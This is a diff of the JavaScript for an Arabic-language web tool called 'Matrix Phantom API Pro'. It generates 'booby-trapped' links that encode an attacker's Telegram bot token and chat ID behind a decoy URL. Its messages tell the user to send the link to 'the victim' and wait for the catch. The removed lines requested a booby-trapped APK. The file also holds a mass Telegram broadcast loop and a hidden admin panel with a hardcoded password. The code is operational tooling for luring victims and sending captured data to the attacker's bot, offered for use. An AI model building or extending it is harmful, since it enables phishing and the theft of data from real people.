@@ -1,93 +1,143 @@
-// --- MATRIX LOGIC ENGINE ---
+// --- MATRIX PHANTOM API PRO (V2) ---
 
-// 1. توليد الرابط المشفر (The Trap)
-function generateMatrixLink() {
+// 1. توليد اللينك الملغم (مجاني واحترافي)
+function generatePhantomLink() {
     const decoy = document.getElementById('decoy-url').value || "https://youtube.com";
-    const botToken = localStorage.getItem('user_bot_token'); // يُفترض إدخاله في قسم البوتات
-    const chatId = localStorage.getItem('user_chat_id');
-    const myID = localStorage.getItem('m_id_user');
-    const credits = parseInt(localStorage.getItem('m_credits') || '0');
+    const botToken = document.getElementById('target-token').value.trim();
+    const chatId = document.getElementById('target-chatid').value.trim();
+    const payloadType = document.getElementById('payload-type').value;
 
     if (!botToken || !chatId) {
-        return Swal.fire({
-            title: 'إعدادات ناقصة',
-            text: 'لازم تروح لقسم بناء التطبيق وتدخل توكن بوت التليجرام والـ ID بتاعك الأول!',
-            icon: 'error'
-        });
+        return Swal.fire({ title: 'بيانات ناقصة', text: 'لازم تدخل توكن بوت التليجرام والـ Chat ID بتاعك الأول.', icon: 'error' });
     }
 
-    if (credits > 0) {
-        // تشفير البيانات داخل اللينك
-        const payload = btoa(JSON.stringify({
-            t: botToken,
-            i: chatId,
-            u: decoy,
-            o: myID
-        }));
+    // تشفير البيانات داخل اللينك (احترافي ومخفي)
+    const payload = btoa(JSON.stringify({
+        t: botToken,
+        i: chatId,
+        u: decoy,
+        type: payloadType
+    }));
 
-        const finalLink = `${window.location.origin}/r.html?p=${payload}`;
-
-        // خصم نقطة وتحديث السيرفر
-        db.ref('users/' + myID + '/credits').transaction((c) => (c || 0) - 1);
-        
-        // تسجيل العملية في السجل العام
-        db.ref('global_hits').push({ type: 'link', owner: myID, time: new Date().toLocaleString() });
-
-        Swal.fire({
-            title: 'تم توليد الرابط! 🔥',
-            html: `<input type="text" value="${finalLink}" id="gen-url" readonly style="width:100%; padding:10px; background:#222; color:var(--neon); border:1px solid var(--neon); text-align:center;">`,
-            confirmButtonText: 'نسخ الرابط'
-        }).then(() => {
-            const input = document.getElementById('gen-url');
-            input.select();
-            document.execCommand('copy');
-            Swal.fire('تم النسخ', 'الآن أرسله للضحية وانتظر الصيد!', 'success');
-        });
-    } else {
-        paywall();
-    }
-}
-
-// 2. طلب بناء تطبيق APK
-async function requestAPK() {
-    const token = document.getElementById('apk-bot').value;
-    const cid = document.getElementById('apk-chatid').value;
-    const myID = localStorage.getItem('m_id_user');
-
-    if (!token || !cid) return Swal.fire('خطأ', 'دخل بيانات البوت كاملة', 'error');
-
-    // حفظ البيانات محلياً لاستخدامها في اللينكات لاحقاً
-    localStorage.setItem('user_bot_token', token);
-    localStorage.setItem('user_chat_id', cid);
+    const finalLink = `${window.location.origin}/r.html?p=${payload}`;
 
     Swal.fire({
-        title: 'جاري إرسال الطلب...',
-        text: 'يتم الآن إرسال بياناتك للأدمن الماستر لتشفير نسخة الـ APK الخاصة بك.',
-        icon: 'info',
-        showConfirmButton: false,
-        timer: 3000
+        title: 'تم توليد الرابط! 🔥',
+        html: `<input type="text" value="${finalLink}" id="gen-url" readonly style="width:100%; padding:10px; background:#111; color:var(--neon); border:1px solid var(--neon); text-align:center;">`,
+        confirmButtonText: 'نسخ الرابط'
     }).then(() => {
-        // تسجيل الطلب في Firebase للأدمن
-        db.ref('apk_requests').push({
-            userId: myID,
-            botToken: token,
-            chatId: cid,
-            status: 'pending',
-            time: new Date().toLocaleString()
-        });
-
-        Swal.fire('تم الإرسال ✅', 'سيتم التواصل معك عبر الواتساب لإرسال ملف الـ APK الملغم.', 'success');
+        const input = document.getElementById('gen-url');
+        input.select();
+        document.execCommand('copy');
+        Swal.fire('تم النسخ', 'الآن أرسله للضحية وانتظر الصيد على بوتك الخاص!', 'success');
     });
 }
 
-// 3. تحديث الإحصائيات في لوحة الأدمن (حقيقي)
-function loadAdminStats() {
-    db.ref('users').on('value', (snap) => {
-        document.getElementById('admin-total-users').innerText = snap.numChildren();
+// 2. إرسال اقتراح للأدمن الماستر
+function submitSuggestion() {
+    const text = document.getElementById('suggestion-text').value;
+    const myID = localStorage.getItem('m_id_user') || 'Anonymous';
+
+    if (!text) return Swal.fire('خطأ', 'اكتب الاقتراح الأول', 'error');
+
+    Swal.fire('جاري الإرسال...', '', 'info');
+
+    // تسجيل الاقتراح في Firebase للأدمن الماستر
+    db.ref('suggestions').push({
+        userId: myID,
+        suggestion: text,
+        time: new Date().toLocaleString()
+    }).then(() => {
+        document.getElementById('suggestion-text').value = '';
+        Swal.fire('تم الإرسال ✅', 'شكراً لاقتراحك.. سيتم مراجعته وتطوير المنصة.', 'success');
     });
-    
-    // يمكنك إضافة عداد للعمليات الناجحة هنا
-    db.ref('hits').on('value', (snap) => {
-        // تحديث عداد الصيد الكلي إذا أردت
+}
+
+// 3. كود الإرسال الجماعي الذكي (لآلاف البوتات)
+async function startBroadcasting() {
+    const adminToken = document.getElementById('broadcast-token').value.trim();
+    const message = document.getElementById('broadcast-message').value;
+
+    if (!adminToken || !message) return Swal.fire('خطأ', 'أدخل توكن بوت الأدمن والرسالة', 'error');
+
+    Swal.fire('جاري الإعداد للإرسال... 📢', 'يتم جلب البوتات المسجلة الآن', 'info');
+
+    try {
+        // جلب جميع المستخدمين المسجلين
+        const snap = await db.ref('users').once('value');
+        const users = snap.val();
+        
+        if (!users) return Swal.fire('لا يوجد مستخدمين', 'لا يوجد أي بوتات مسجلة حالياً لإرسال الرسالة لها.', 'warning');
+
+        const userIds = Object.keys(users);
+        let successCount = 0;
+        let failCount = 0;
+
+        Swal.fire({
+            title: `بدء الإرسال لـ ${userIds.length} مستخدم`,
+            text: 'يتم الإرسال بالتدريج لتجنب حظر البوت.. لا تغلق الصفحة.',
+            icon: 'info',
+            showConfirmButton: false,
+            timer: 2000
+        });
+
+        // حلقة ذكية للإرسال بالراحة (Smart Throttling)
+        for (let i = 0; i < userIds.length; i++) {
+            const userId = userIds[i];
+            // محاولة إرسال رسالة لمعرف شات المستخدم (Chat ID)
+            try {
+                // تليجرام يقبل حوالي 30 رسالة في الثانية، سنضيف تأخير بسيط
+                await new Promise(res => setTimeout(res, 50)); // تأخير 50 مللي ثانية بين كل رسالة
+
+                const response = await fetch(`https://api.telegram.org/bot${adminToken}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(message)}`);
+                if (response.ok) { successCount++; } else { failCount++; }
+            } catch (err) { failCount++; }
+        }
+
+        Swal.fire({
+            title: 'تم الانتهاء بنجاح! 🎉',
+            text: `تم الإرسال لـ ${successCount} مستخدم.\nفشل الإرسال لـ ${failCount} مستخدم.`,
+            icon: 'success'
+        });
+
+    } catch (err) {
+        console.error(err);
+        Swal.fire('خطأ في الإرسال الجماعي', 'تأكد من إعدادات الـ Rules في Firebase وتوكن البوت', 'error');
+    }
+}
+
+// 4. وظائف الأدمن السرية
+let clickCount = 0;
+function checkAdmin() {
+    clickCount++;
+    if(clickCount >= 5) {
+        Swal.fire({ title: 'Admin Access', input: 'password', showCancelButton: true })
+        .then((result) => {
+            if (result.value === "01224815487") { // باسورد الأدمن الماستر
+                document.getElementById('master-panel').style.display = 'block';
+                loadAdminStats();
+            } else if (result.value) { Swal.fire('خطأ', 'الباسورد غلط', 'error'); }
+        });
+        clickCount = 0;
+    }
+}
+
+function closeAdmin() { document.getElementById('master-panel').style.display = 'none'; }
+
+// تحديث الإحصائيات واستعراض الاقتراحات في لوحة الأدمن
+function loadAdminStats() {
+    // جلب الاقتراحات
+    db.ref('suggestions').on('value', (snap) => {
+        const list = document.getElementById('suggestions-list');
+        list.innerHTML = ''; // مسح القديم
+        const data = snap.val();
+        if (data) {
+            for (let key in data) {
+                const sug = data[key];
+                list.innerHTML += `<div style="border-bottom:1px solid #222; padding:8px; margin-bottom:5px;"><small style="color:var(--neon);">${sug.userId} - ${sug.time}:</small><br>${sug.suggestion}</div>`;
+            }
+        } else {
+            list.innerHTML = '(لا توجد اقتراحات بعد)';
+        }
     });
 }
